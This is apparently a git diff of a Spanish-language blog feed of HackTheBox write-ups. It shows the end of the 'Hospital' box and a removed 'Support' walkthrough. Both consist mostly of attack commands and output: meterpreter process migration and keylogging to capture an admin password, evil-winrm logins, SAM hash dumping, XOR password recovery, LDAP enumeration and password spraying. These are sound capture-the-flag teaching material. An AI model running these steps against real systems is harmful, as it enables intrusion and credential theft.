+ 6756  4116  shell.exe  x64   0        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\U</span>sers<span class="se">\d</span>rbrow
+                                       wn              n.HOSPITAL<span class="se">\D</span>esk
+                                                       top<span class="se">\s</span>hell.exe
+ 6816  656   svchost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             xe                        wn              em32<span class="se">\s</span>vchost.ex
+                                                       e
+ 6920  6964  ctfmon.ex  x64   1
+             e
+ 6924  912   SearchUI.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             exe                       wn              emApps<span class="se">\M</span>icrosof
+                                                       t.Windows.Corta
+                                                       na_cw5n1h2txyew
+                                                       y<span class="se">\S</span>earchUI.exe
+ 6964  656   svchost.e
+             xe
+ 7248  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
+                                                       ker.exe
+ 7264  656   svchost.e
+             xe
+ 7316  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
+                                                       ker.exe
+ 7396  1540  powershel  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             l.exe                     wn              em32<span class="se">\W</span>indowsPow
+                                                       erShell<span class="se">\v</span>1.0<span class="se">\p</span>o
+                                                       wershell.exe
+ 7496  656   svchost.e
+             xe
+ 7548  5528  vmwp.exe
+ 7636  7876  iexplore.  x86   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
+             exe                       wn              s <span class="o">(</span>x86<span class="o">)</span><span class="se">\I</span>nterne
+                                                       t Explorer<span class="se">\i</span>exp
+                                                       lore.exe
+ 7672  656   svchost.e
+             xe
+ 7824  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
+             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
+                                                       ker.exe
+ 7876  6256  iexplore.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
+             exe                       wn              s<span class="se">\i</span>nternet expl
+                                                       orer<span class="se">\i</span>explore.e
+                                                       xe
+ 7948  6188  vmtoolsd.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
+             exe                       wn              s<span class="se">\V</span>Mware<span class="se">\V</span>Mware
+                                                        Tools<span class="se">\v</span>mtoolsd
+                                                       .exe
+
+meterpreter <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vemos que el <code class="language-plaintext highlighter-rouge">Dr</code> esta corriendo  <code class="language-plaintext highlighter-rouge">iexplore.exe</code> como la sesión activa es del doctor el es el que esta corriendo el servicio en lo que consiste esta escalada es un hacer un <code class="language-plaintext highlighter-rouge">keylogger</code> para ver lo que hace el <code class="language-plaintext highlighter-rouge">Dr</code> con el proceso.</p>
+  </li>
+  <li>
+    <p>Vamos a migrar al proceso.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> migrate 7824
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migrating from 3452 to 7824...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migration completed successfully.
+meterpreter <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora iniciamos el <code class="language-plaintext highlighter-rouge">keylogger</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> keyscan_start
+Starting the keystroke sniffer ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a esperar unos minutos para ver que información capturamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> keyscan_dump
+Dumping captured keystrokes...
+administratorTh3B3stH0sp1t4l9786!
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno obtenemos credenciales que lo que parece ser son del administrador.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ evil-winrm <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'Th3B3stH0sp1t4l9786!'</span> <span class="nt">-i</span> 10.10.11.241
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>hospital<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<h2 id="hashes">Hashes</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ cme smb 10.10.11.241 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'Th3B3stH0sp1t4l9786!'</span> <span class="nt">--sam</span>
+SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.241    445    DC               <span class="o">[</span>+] hospital.htb<span class="se">\A</span>dministrator:Th3B3stH0sp1t4l9786! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.10.11.241    445    DC               <span class="o">[</span>+] Dumping SAM hashes
+SMB         10.10.11.241    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:e1ae906d259a980297d5eb72aa7ba35c:::
+SMB         10.10.11.241    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.11.241    445    DC               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ERROR:root:SAM hashes extraction <span class="k">for </span>user WDAGUtilityAccount failed. The account doesn<span class="s1">'t have hash information.
+SMB         10.10.11.241    445    DC               [+] Added 3 SAM hashes to the database
+</span></code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Sizzle (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle.html" rel="alternate" type="text/html" title="HackTheBox - Sizzle (insane)" /><published>2024-05-07T00:00:00-06:00</published><updated>2024-05-07T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/ed709304142fdf369e529d6e843ad62e.png" />
 </p>
 
@@ -10006,629 +11160,4 @@ C:<span class="se">\&gt;</span><span class="nb">whoami
 
 C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
 5cbe8d044ee14475a7b40e8abd97c5a1
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Support (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/04/11/support.html" rel="alternate" type="text/html" title="HackTheBox - Support (easy)" /><published>2024-04-11T00:00:00-06:00</published><updated>2024-04-11T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/04/11/support</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/04/11/support.html"><![CDATA[<p align="center">
-<img src="https://labs.hackthebox.com/storage/avatars/833a3b1f7f96b5708d19b6de084c3201.png" />
-</p>
-
-<h2 id="portscan">PortScan</h2>
-
-<ul>
-  <li>Comenzamos escaneando los puertos abiertos y sus tecnologias con la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49711 10.129.245.29 <span class="nt">-oN</span> targeted
-Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-29 12:41 CST
-Nmap scan report <span class="k">for </span>10.129.245.29
-Host is up <span class="o">(</span>0.091s latency<span class="o">)</span><span class="nb">.</span>
-
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span class="o">)</span>
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span class="o">)</span>
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open  mc-nmf        .NET Message Framing
-49664/tcp open  msrpc         Microsoft Windows RPC
-49667/tcp open  msrpc         Microsoft Windows RPC
-49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49711/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-time:
-|   <span class="nb">date</span>: 2024-03-29T18:42:15
-|_  start_date: N/A
-| smb2-security-mode:
-|   3:1:1:
-|_    Message signing enabled and required
-</code></pre></div></div>
-
-<h2 id="enumeración">Enumeración</h2>
-
-<ul>
-  <li>Vamos agregar en nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.245.29
-SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-
-➜  nmap <span class="nb">echo</span> <span class="s2">"10.129.245.29 support.htb dc.support.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
-10.129.245.29 support.htb dc.support.htb
-</code></pre></div></div>
-
-<ul>
-  <li>Si listamos los recursos compartidos por el protocolo <strong>smb</strong> vemos que tenemos acceso a un directorio llamado <strong>support-tools</strong>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.245.29 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
-SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.245.29   445    DC               <span class="o">[</span>+] support.htb<span class="se">\m</span>iguel:
-SMB         10.129.245.29   445    DC               <span class="o">[</span>+] Enumerated shares
-SMB         10.129.245.29   445    DC               Share           Permissions     Remark
-SMB         10.129.245.29   445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
-SMB         10.129.245.29   445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
-SMB         10.129.245.29   445    DC               C<span class="nv">$ </span>                             Default share
-SMB         10.129.245.29   445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
-SMB         10.129.245.29   445    DC               NETLOGON                        Logon server share
-SMB         10.129.245.29   445    DC               support-tools   READ            support staff tools
-SMB         10.129.245.29   445    DC               SYSVOL                          Logon server share
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a conectarnos al recurso compartido.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap impacket-smbclient support.htb/miguel@10.129.245.29 <span class="nt">-no-pass</span>
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-Type <span class="nb">help </span><span class="k">for </span>list of commands
-<span class="c"># use support-tools</span>
-<span class="c"># ls</span>
-drw-rw-rw-          0  Wed Jul 20 12:01:06 2022 <span class="nb">.</span>
-drw-rw-rw-          0  Sat May 28 06:18:25 2022 ..
-<span class="nt">-rw-rw-rw-</span>    2880728  Sat May 28 06:19:19 2022 7-ZipPortable_21.07.paf.exe
-<span class="nt">-rw-rw-rw-</span>    5439245  Sat May 28 06:19:55 2022 npp.8.4.1.portable.x64.zip
-<span class="nt">-rw-rw-rw-</span>    1273576  Sat May 28 06:20:06 2022 putty.exe
-<span class="nt">-rw-rw-rw-</span>   48102161  Sat May 28 06:19:31 2022 SysinternalsSuite.zip
-<span class="nt">-rw-rw-rw-</span>     277499  Wed Jul 20 12:01:07 2022 UserInfo.exe.zip
-<span class="nt">-rw-rw-rw-</span>      79171  Sat May 28 06:20:17 2022 windirstat1_1_2_setup.exe
-<span class="nt">-rw-rw-rw-</span>   44398000  Sat May 28 06:19:43 2022 WiresharkPortable64_3.6.5.paf.exe
-</code></pre></div></div>
-
-<ul>
-  <li>Encontramos varios <code class="language-plaintext highlighter-rouge">.exe</code> pero sin duda el que llama mas la atención es el <strong>UserInfo.exe.zip</strong> vamos a descargarlo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># get UserInfo.exe.zip</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Antes de descomprimirlo vamos a ver que es lo que hay dentro.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l UserInfo.exe.zip
-
-7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
- 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024
-
-Scanning the drive <span class="k">for </span>archives:
-1 file, 277499 bytes <span class="o">(</span>271 KiB<span class="o">)</span>
-
-Listing archive: UserInfo.exe.zip
-
-<span class="nt">--</span>
-Path <span class="o">=</span> UserInfo.exe.zip
-Type <span class="o">=</span> zip
-Physical Size <span class="o">=</span> 277499
-
-   Date      Time    Attr         Size   Compressed  Name
-<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
-2022-05-27 11:51:05 .....        12288         5424  UserInfo.exe
-2022-03-01 12:18:50 .....        99840        41727  CommandLineParser.dll
-2021-10-22 17:42:08 .....        22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
-2021-10-22 17:48:04 .....        47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll
-2021-10-22 17:48:22 .....        84608        39154  Microsoft.Extensions.DependencyInjection.dll
-2021-10-22 17:51:24 .....        64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
-2020-02-19 04:05:18 .....        20856        11403  System.Buffers.dll
-2020-02-19 04:05:18 .....       141184        58623  System.Memory.dll
-2018-05-15 07:29:44 .....       115856        32709  System.Numerics.Vectors.dll
-2021-10-22 17:40:18 .....        18024         9541  System.Runtime.CompilerServices.Unsafe.dll
-2020-02-19 04:05:18 .....        25984        13437  System.Threading.Tasks.Extensions.dll
-2022-05-27 10:59:39 .....          563          327  UserInfo.exe.config
-<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
-2022-05-27 11:51:05             652675       274861  12 files
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Bueno al parecer hay muchos archivos de configuración así que para ver mejor el contenido y ver que se hace por detrás vamos a pasar el comprimido a una maquina Windows para usar <code class="language-plaintext highlighter-rouge">dnspy</code> y <code class="language-plaintext highlighter-rouge">debugear</code> el archivo <a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a>.</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">Debugeando</code> encontramos un código interesante.</p>
-  </li>
-  <li>
-    <p>El código configura una conexión LDAP llama a un método <code class="language-plaintext highlighter-rouge">Protected.getPassword()</code> para recuperar una contraseña.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/support/1.png" />
-</p>
-
-<ul>
-  <li>Si nos vamos a <code class="language-plaintext highlighter-rouge">Protected</code> vemos el código que al parecer lo que hace es desencriptar una contraseña que esta codificada en <code class="language-plaintext highlighter-rouge">base64</code> y encriptada mediante una operación <code class="language-plaintext highlighter-rouge">XOR</code>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/support/2.png" />
-</p>
-
-<ul>
-  <li>En el campo <code class="language-plaintext highlighter-rouge">enc_password</code> almacena una cadena que es una contraseña encriptada que esta en formato base64 y el campo <code class="language-plaintext highlighter-rouge">key</code> almacena una clave en forma de arreglo la clave parece ser derivada de la cadena <strong>armando</strong>.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/easy/support/3.png" />
-</p>
-
-<ul>
-  <li>
-    <p>El problema de esto es que sabemos como funciona todo para poder obtener la contraseña en texto plano podemos usar Python3 para obtenerla simplemente siguiendo el funcionamiento del código.</p>
-  </li>
-  <li>
-    <p>Simplemente ejecutamos <code class="language-plaintext highlighter-rouge">Python3</code> e importamos el modulo <code class="language-plaintext highlighter-rouge">base64</code> para decodificar la contraseña encriptada, después la variable <code class="language-plaintext highlighter-rouge">enc_password</code> contiene la contraseña encriptada, la clave <code class="language-plaintext highlighter-rouge">key</code> contiene la clave para la operación <code class="language-plaintext highlighter-rouge">XOR</code> que en este caso la clave es la cadena <code class="language-plaintext highlighter-rouge">ASCII</code> <strong>armando</strong>, después la contraseña encriptada se decodifica, se realiza la operación mediante un ciclo for que itera sobre cada byte de la contraseña encriptada y lo desencripta utilizando la calve y el valor (223) mediante la operación <code class="language-plaintext highlighter-rouge">XOR</code> y al final el resultado se convierte a una cadena utilizando caracteres <code class="language-plaintext highlighter-rouge">UTF-8</code> y se muestra por pantalla.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3
-Python 3.11.8 <span class="o">(</span>main, Feb  7 2024, 21:52:08<span class="o">)</span> <span class="o">[</span>GCC 13.2.0] on linux
-Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
-<span class="o">&gt;&gt;&gt;</span> import <span class="nb">base64</span>
-<span class="o">&gt;&gt;&gt;</span> enc_password <span class="o">=</span> <span class="s2">"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"</span>
-<span class="o">&gt;&gt;&gt;</span> key <span class="o">=</span> bytes<span class="o">(</span><span class="s2">"armando"</span>, <span class="nv">encoding</span><span class="o">=</span><span class="s1">'ascii'</span><span class="o">)</span>
-<span class="o">&gt;&gt;&gt;</span> decoded_password <span class="o">=</span> base64.b64decode<span class="o">(</span>enc_password<span class="o">)</span>
-<span class="o">&gt;&gt;&gt;</span> decrypted_password <span class="o">=</span> bytes<span class="o">([</span>decoded_password[i] ^ key[i % len<span class="o">(</span>key<span class="o">)]</span> ^ 223 <span class="k">for </span>i <span class="k">in </span>range<span class="o">(</span>len<span class="o">(</span>decoded_password<span class="o">))])</span>
-<span class="o">&gt;&gt;&gt;</span> password <span class="o">=</span> decrypted_password.decode<span class="o">(</span><span class="s1">'utf-8'</span><span class="o">)</span>
-<span class="o">&gt;&gt;&gt;</span> print<span class="o">(</span><span class="s2">"Decrypted Password:"</span>, password<span class="o">)</span>
-Decrypted Password: nvEfEK16^1aM4<span class="nv">$e7AclUf8x$tRWxPWO1</span>%lmz
-<span class="o">&gt;&gt;&gt;</span>
-</code></pre></div></div>
-
-<h2 id="shell-as-support">Shell as Support</h2>
-
-<ul>
-  <li>Una vez tenemos la contraseña en texto plano podemos comprobar si son correctas ya que nos decía que con el usuario <code class="language-plaintext highlighter-rouge">ldap</code> podemos conectarnos al servicio utilizando la contraseña.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec ldap 10.129.245.29 <span class="nt">-u</span> ldap <span class="nt">-p</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span>
-SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-LDAP        10.129.245.29   389    DC               <span class="o">[</span>+] support.htb<span class="se">\l</span>dap:nvEfEK16^1aM4<span class="nv">$e7AclUf8x$tRWxPWO1</span>%lmz
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Al ver que son correctas podemos enumerar el servicio <code class="language-plaintext highlighter-rouge">ldap</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</a>.</p>
-  </li>
-  <li>
-    <p>Al parecer el output es demasiada información pero si <code class="language-plaintext highlighter-rouge">grepeamos</code> por <code class="language-plaintext highlighter-rouge">info:</code> encontramos una contraseña.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ldapsearch <span class="nt">-H</span> ldap://support.htb <span class="nt">-D</span> <span class="s1">'support\ldap'</span> <span class="nt">-w</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> <span class="nt">-b</span> <span class="s1">'CN=Users,DC=support,DC=htb'</span> | <span class="nb">grep </span>info:
-info: Ironside47pleasure40Watchful
-</code></pre></div></div>
-
-<ul>
-  <li>Al parecer es del usuario <code class="language-plaintext highlighter-rouge">Support</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>info: Ironside47pleasure40Watchful
-memberOf: <span class="nv">CN</span><span class="o">=</span>Shared Support Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
-memberOf: <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
-uSNChanged: 12630
-company: support
-streetAddress: Skipper Bowles Dr
-name: support
-objectGUID:: <span class="nv">CqM5MfoxMEWepIBTs5an8Q</span><span class="o">==</span>
-userAccountControl: 66048
-badPwdCount: 0
-codePage: 0
-countryCode: 0
-badPasswordTime: 0
-lastLogoff: 0
-lastLogon: 0
-pwdLastSet: 132982099209777070
-primaryGroupID: 513
-objectSid:: <span class="nv">AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA</span><span class="o">==</span>
-accountExpires: 9223372036854775807
-logonCount: 0
-sAMAccountName: support
-sAMAccountType: 805306368
-objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
-dSCorePropagationData: 20220528111201.0Z
-dSCorePropagationData: 16010101000000.0Z
-</code></pre></div></div>
-
-<ul>
-  <li>Probando con <code class="language-plaintext highlighter-rouge">rpcclient</code> podemos conectarnos y enumerar los usuarios del dominio.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.129.245.29 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span>
-user:[Administrator] rid:[0x1f4]
-user:[Guest] rid:[0x1f5]
-user:[krbtgt] rid:[0x1f6]
-user:[ldap] rid:[0x450]
-user:[support] rid:[0x451]
-user:[smith.rosario] rid:[0x452]
-user:[hernandez.stanley] rid:[0x453]
-user:[wilson.shelby] rid:[0x454]
-user:[anderson.damian] rid:[0x455]
-user:[thomas.raphael] rid:[0x456]
-user:[levine.leopoldo] rid:[0x457]
-user:[raven.clifton] rid:[0x458]
-user:[bardot.mary] rid:[0x459]
-user:[cromwell.gerard] rid:[0x45a]
-user:[monroe.david] rid:[0x45b]
-user:[west.laura] rid:[0x45c]
-user:[langley.lucy] rid:[0x45d]
-user:[daughtler.mabel] rid:[0x45e]
-user:[stoll.rachelle] rid:[0x45f]
-user:[ford.victoria] rid:[0x460]
-</code></pre></div></div>
-
-<ul>
-  <li>Como tenemos una contraseña vamos a guardar los usuarios en una lista.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.129.245.29 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\D*?\]'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
-➜  content <span class="nb">cat </span>users.txt
-Administrator
-Guest
-krbtgt
-ldap
-support
-smith.rosario
-hernandez.stanley
-wilson.shelby
-anderson.damian
-thomas.raphael
-levine.leopoldo
-raven.clifton
-bardot.mary
-cromwell.gerard
-monroe.david
-west.laura
-langley.lucy
-daughtler.mabel
-stoll.rachelle
-ford.victoria
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a ver si podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> con la contraseña que tenemos para ver si le pertenece a otro usuario por que con <code class="language-plaintext highlighter-rouge">rpcclient</code> vimos que es de <code class="language-plaintext highlighter-rouge">support</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.245.29 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'Ironside47pleasure40Watchful'</span> <span class="nt">--continue-on-success</span>
-SMB         10.129.245.29   5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span>
-HTTP        10.129.245.29   5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.245.29:5985/wsman
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\A</span>dministrator:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\G</span>uest:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\k</span>rbtgt:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>dap:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>+] support.htb<span class="se">\s</span>upport:Ironside47pleasure40Watchful <span class="o">(</span>Pwn3d!<span class="o">)</span>
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\s</span>mith.rosario:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\h</span>ernandez.stanley:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\w</span>ilson.shelby:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\a</span>nderson.damian:Ironside47pleasure40Watchful
-WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\t</span>homas.raphael:Ironside47pleasure40Watchful
